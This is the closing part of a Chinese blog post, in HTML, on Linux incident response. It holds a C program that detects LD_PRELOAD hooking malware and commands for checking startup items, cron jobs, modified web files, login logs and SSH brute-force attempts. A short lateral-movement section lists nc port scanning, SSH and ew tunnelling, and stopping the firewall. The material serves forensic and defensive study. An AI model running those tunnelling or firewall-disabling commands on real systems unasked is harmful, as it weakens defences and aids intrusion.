hooked_funcs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dlinfo_check</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">lm</span>;</span></span><br><span class="line">    dlinfo(dlopen(<span class="literal">NULL</span>, RTLD_LAZY), <span class="number">2</span>, &amp;lm);</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] beginning dlinfo check.\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(lm != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(lm-&gt;l_name) &gt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%p %s\n&quot;</span>, (<span class="type">void</span> *)lm-&gt;l_addr, lm-&gt;l_name);</span><br><span class="line">        lm = lm-&gt;l_next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">ifdef</span> VERBOSE</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] dlinfo check finished.\n&quot;</span>);</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>)) <span class="built_in">printf</span>(<span class="string">&quot;OK.. LD_PRELOAD is visible in the local environment variables.. little warning\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(access(<span class="string">&quot;/etc/ld.so.preload&quot;</span>, F_OK) != <span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;OK.. /etc/ld.so.preload DOES definitely exist.. little warning\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] finished basic checks\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    dlinfo_check(); <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> hooked_funcs = dladdr_check();</span><br><span class="line">    <span class="keyword">if</span>(hooked_funcs &gt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[!] the dladdr check revealed that there are %d possibly hooked functions. YOUR MALWARE SUUUUCKS.\n&quot;</span>, hooked_funcs);</span><br><span class="line">    <span class="keyword">if</span>(hooked_funcs == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[+] no modifications to any libc functions were found. no LD_PRELOAD malware loaded, or your malware is decent.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="启动项排查"><a href="#启动项排查" class="headerlink" title="启动项排查"></a>启动项排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/rc.local            排查rc.local文件中添加的启动项命令</span><br><span class="line">ls /etc/init.d               排查init.d目录下添加的自启动脚本</span><br><span class="line">ls /etc/profile.d            排查profile.d目录下添加的自启动脚本</span><br><span class="line">chkconfig --list             centos系统列出自启动项</span><br></pre></td></tr></table></figure>
+
+<h2 id="后门查找"><a href="#后门查找" class="headerlink" title="后门查找"></a>后门查找</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">将整个web目录和备份目录进行对比，排查出被修改的文件</span><br><span class="line">diff -urNA webdir webdir_bak</span><br><span class="line"></span><br><span class="line">使用find命令配合mtime、ctime参数，搜索事发时间时间段，指定格式的被修改文件</span><br><span class="line">find /var/www/html -mtime +0 &quot;*.jsp&quot;       搜索web目录下24小时内被修改的jsp文件</span><br><span class="line"></span><br><span class="line">部分计划任务可能会存在/var/spool/cron和/etc/cron.d目录下，并且部分日志并不是root添加的，而是其他具备root权限的用户添加的，</span><br><span class="line">crontab -l -u username</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -z -v ip port          使用系统自带的nc进行端口扫描</span><br><span class="line">ssh -CfNg                 搭建ssh隧道</span><br><span class="line">ew -s                     使用ew搭建隧道</span><br><span class="line">service iptables/firewalld stop     关闭iptables</span><br></pre></td></tr></table></figure>
+
+<h2 id="登录信息"><a href="#登录信息" class="headerlink" title="登录信息"></a>登录信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/secure | grep Accepted </span><br><span class="line">cat /var/log/secure | grep Accepted | grep ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ssh爆破信息"><a href="#ssh爆破信息" class="headerlink" title="ssh爆破信息"></a>ssh爆破信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lastb root | awk &#x27;&#123;print $3&#125;&#x27; | sort </span><br><span class="line">lastb root | awk &#x27;&#123;print $3&#125;&#x27; | sort |uniq -c </span><br><span class="line">lastb root | awk &#x27;&#123;print $3&#125;&#x27; | sort |uniq -c |sort -rn |more</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章进行指正，联系邮箱 vou0515@gmail.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2023 closeto
+</p>
+<p class="footer-entry">Built with Hexo</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+        /* 渲染*/
+        function HTMLDecode(text) {
+            var temp = document.createElement("div");
+            temp.innerHTML = text;
+            var output = temp.innerText || temp.textContent;
+            temp = null;
+            return output;
+        }
+        if (window.mermaid){
+            window.mermaid = null
+        }
+        $.getScript("//cdn.jsdelivr.net/npm/mermaid@8.4.2/dist/mermaid.min.js", function () {
+            var mermaidOptions = JSON.parse(HTMLDecode("{&#34;theme&#34;:&#34;default&#34;,&#34;startOnLoad&#34;:true,&#34;flowchart&#34;:{&#34;useMaxWidth&#34;:false,&#34;htmlLabels&#34;:true}}"))
+            if (window.mermaid) {
+                mermaid.initialize(mermaidOptions)
+                mermaid.contentLoaded()
+            }
+        })
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 562px;
+    }
+    .nav.fullscreen {
+        margin-left: -562px;
+    }
+    .nav-left {
+        width: 140px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
